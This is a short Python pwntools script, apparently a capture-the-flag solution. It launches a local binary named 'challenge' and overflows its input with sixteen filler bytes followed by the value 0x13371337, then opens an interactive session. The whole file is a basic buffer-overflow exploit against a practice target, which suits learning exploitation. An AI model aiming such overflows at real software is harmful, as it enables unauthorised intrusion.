from pwn import *

elf = ELF("./challenge")
context.log_level = "debug"
gs = '''
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

p = start()
p.sendafter(b"send your input:\n", b"A"*0x10 + p64(0x13371337))
p.interactive()